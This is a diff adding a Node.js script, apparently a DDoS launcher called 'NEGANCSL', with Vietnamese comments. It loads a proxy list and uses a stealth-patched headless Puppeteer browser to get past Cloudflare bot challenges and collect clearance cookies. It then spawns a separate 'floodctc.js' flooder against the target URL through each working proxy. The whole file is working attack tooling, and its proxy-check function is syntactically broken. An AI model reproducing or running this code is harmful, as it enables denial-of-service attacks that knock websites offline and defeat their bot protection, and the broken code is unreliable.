@@ -1,0 +1,147 @@
+// Hàm xử lý lỗi, hiện tại không làm gì cả
+const xuLyLoi = loi => {};
+
+// Bắt sự kiện khi có lỗi không được bắt (uncaught exception)
+process.on("uncaughtException", xuLyLoi);
+
+// Bắt sự kiện khi có promise bị từ chối mà không được xử lý (unhandled rejection)
+process.on("unhandledRejection", xuLyLoi);
+
+// Thêm phương thức remove vào prototype của Array để xóa một phần tử khỏi mảng
+Array.prototype.xoa = function (phanTu) { const index = this.indexOf(phanTu); if (index !== -1) this.splice(index, 1); return phanTu; }
+
+// Số lần thử lại tối đa khi lấy cookie
+const SO_LAN_THU_LAI = 1;
+
+// Import các thư viện cần thiết
+const async = require("async"), fs = require("fs"), request = require("request"), puppeteer = require("puppeteer-extra"), puppeteerStealth = require("puppeteer-extra-plugin-stealth");
+
+// Tăng giới hạn số lượng listener để tránh cảnh báo về memory leak
+process.setMaxListeners(0); require('events').EventEmitter.defaultMaxListeners = 0;
+
+// Sử dụng plugin stealth để tránh bị phát hiện là bot
+puppeteer.use(puppeteerStealth());
+
+// Import hàm spawn từ module child_process để chạy các lệnh hệ thống
+const { spawn } = require("child_process");
+
+// Kiểm tra số lượng tham số truyền vào, nếu không đủ thì thoát chương trình
+if (process.argv.length < 7) { console.clear(); console.log(`node NEGANCSL url thread proxylist rate duration`); process.exit(1); }
+
+// Lấy các tham số từ command line
+const targetURL = process.argv[2], threads = +process.argv[3], proxyFile = process.argv[4], fileContent = fs.readFileSync(proxyFile, 'utf8'), proxiesCount = fileContent.split('\n').length, rates = process.argv[5], duration = process.argv[6];
+
+let soLanGapChallenge = 0; // Biến đếm số lần gặp challenge
+
+// Hàm sleep để tạm dừng chương trình trong một khoảng thời gian
+const sleep = thoiGian => new Promise(resolve => setTimeout(resolve, thoiGian * 1000));
+
+// Hàm đọc các dòng từ file và trả về một mảng các dòng
+const docDong = duongDan => fs.readFileSync(duongDan).toString().split(/\r?\n/);
+
+// Hàm chọn ngẫu nhiên một phần tử từ mảng
+const chonNgauNhien = danhSach => danhSach[Math.floor(Math.random() * danhSach.length)];
+
+// Đọc danh sách proxy từ file
+const proxies = docDong(proxyFile);
+
+// Hàm lấy số nguyên ngẫu nhiên trong khoảng [min, max]
+const laySoNgauNhien = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+
+// Hàm kiểm tra proxy có hoạt động không
+const kiemTraProxy = proxy => new Promise((resolve, reject) => {
+  return new Promise((resolve, reject) => {
+     request({
+       url: "https://google.com",
+       proxy: "http://" + proxy,
+       headers: {
+         'User-Agent': "curl/7.58.0",
+       }
+     }, (err, res, body) => {
+       if (!err && res.statusCode === 200) {
+         resolve(proxy);
+       } else {
+         reject();
+       }
+     });
+   });
+
+// Hàm kiểm tra tính hợp lệ của proxy
+const kiemTraProxyHopLe = async proxy => { try { await kiemTraProxy(proxy); return proxy; } catch (error) { throw new Error(); } }
+
+// Hàm xử lý challenge của Cloudflare
+const xuLyChallenge = async page => { await sleep(15); const captchaContainer = await page.$('body > div.main-wrapper > div > div > div > div'); if (captchaContainer) { const { x, y } = await captchaContainer.boundingBox(); await page.mouse.click(x + 20, y + 20); } await sleep(15); }
+
+// Hàm phát hiện challenge của Cloudflare
+const phatHienChallenge = async (proxy, page) => {
+  await page.waitForSelector('title'); const title = await page.title(); const content = await page.content();
+  if (title === "Attention Required! | Cloudflare") throw new Error("Proxy bị chặn");
+  if (content.includes("challenge-platform")) { console.log("[+] NEGANCSL tìm thấy CLOUDFLARED !!! " + proxy); await xuLyChallenge(page); return; }
+  console.log("[+] NEGANCSL không tìm thấy CLOUDFLARED !!! " + proxy); await sleep(10);
+}
+
+// Hàm mở trình duyệt và thực hiện các yêu cầu
+const moTrinhDuyet = async (targetURL, proxy) => {
+  const userAgents = ['Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36'];
+  const randomUA = chonNgauNhien(userAgents);
+  const promise = async (resolve, reject) => {
+    const browser = await puppeteer.launch({
+      headless: true, ignoreHTTPSErrors: true, detach: true, javaScriptEnabled: true, useAutomationExtension: true,
+      args: ["--proxy-server=http://" + proxy, "--no-sandbox", "--no-first-run", "--no-default-browser-check", "--ignore-certificate-errors", "--disable-extensions", "--test-type", "--disable-gpu", "--disable-browser-side-navigation", "--disable-dev-shm-usage", "--disable-infobars", "--disable-blink-features=AutomationControlled", '--disable-features=IsolateOrigins,site-per-process', '--renderer-process-limit=1', '--mute-audio', '--enable-webgl', '--ignore-certificate-errors', '--use-gl=disabled', '--color-scheme=dark', '--disable-infobars', '--disable-notifications', '--disable-popup-blocking', '--disable-setuid-sandbox', '--disable-accelerated-2d-canvas', "--disable-browser-side-navigation", "--user-agent=" + randomUA],
+      ignoreDefaultArgs: ['--enable-automation']
+    });
+    try {
+      console.log("NEGANCSL chạy : " + proxy + " để tìm CLOUDFLARED !!!");
+      const [page] = await browser.pages(); const client = page._client();
+      await page.setExtraHTTPHeaders({ 'referer': targetURL });
+      await page.evaluateOnNewDocument(() => { navigator.permissions.query = (parameters) => { return Promise.resolve({ state: 'granted' }); }; });
+      await page.setJavaScriptEnabled(true); await page.setViewport({ width: 1920, height: 1080 });
+      page.on("framenavigated", async (frame) => { if (frame.url().includes("challenges.cloudflare.com")) await client.send("Target.detachFromTarget", { targetId: frame._id }); });
+      page.setDefaultNavigationTimeout(60 * 1000);
+      const userAgent = await page.evaluate(() => navigator.userAgent);
+      await page.goto(targetURL, { waitUntil: ["domcontentloaded"] });
+      const title = await page.title();
+      if (title === "Just a moment...") await phatHienChallenge(proxy, page, reject);
+      const cookies = await page.cookies(targetURL);
+      const referer = await page.evaluate(() => document.referrer);
+      resolve({ title: title, browserProxy: proxy, cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(), userAgent: randomUA, content: await page.content(), referer: referer });
+    } catch (exception) {} finally { await browser.close(); }
+  }
+  return new Promise(promise);
+}
+
+// Hàm bắt đầu một luồng (thread) để thực hiện tấn công
+const batDauLuong = async (targetURL, proxy, task, done, retries = 0) => {
+  try {
+    const response = await moTrinhDuyet(targetURL, proxy);
+    const referer = response.referer;
+    const hasChallenge = response.content.includes("challenge-platform");
+    const hasCfChlCookie = response.cookies.includes("cf_chl");
+    const isValidCookie = response.cookies.length > 32;
+    if (!hasChallenge && (!hasCfChlCookie || (hasCfChlCookie && isValidCookie))) {
+      const cookies = "\n ./Từ mục tiêu:" + referer + "\n ./Kiểm tra tiêu đề :" + response.title + "\n ./Proxy trình duyệt : " + response.browserProxy + "\n ./User Agent: " + response.userAgent + "\n ./Cookie: " + response.cookies;
+      console.log(cookies);
+      spawn("node", ["floodctc.js", targetURL, duration, "3", response.browserProxy, rates, response.cookies, response.userAgent]);
+    }
+    await batDauLuong(targetURL, proxy, task, done, SO_LAN_THU_LAI);
+  } catch (exception) { console.error(exception); await batDauLuong(targetURL, proxy, task, done, SO_LAN_THU_LAI); }
+}
+
+// Tạo hàng đợi (queue) để quản lý các luồng
+var queue = async.queue((task, done) => batDauLuong(targetURL, task.browserProxy, task, done), threads);
+
+// Hàm chính để khởi chạy chương trình
+const main = async () => {
+  queue.drain(() => {});
+  for (let i = 0; i < proxiesCount; i++) {
+    const proxy = chonNgauNhien(proxies);
+    proxies.splice(proxies.indexOf(proxy), 1);
+    kiemTraProxyHopLe(proxy).then(proxy => queue.unshift({ browserProxy: proxy })).catch(error => {});
+  }
+  await sleep(duration);
+  queue.kill();
+  process.exit();
+}
+
+// Gọi hàm main để chạy chương trình
+main();
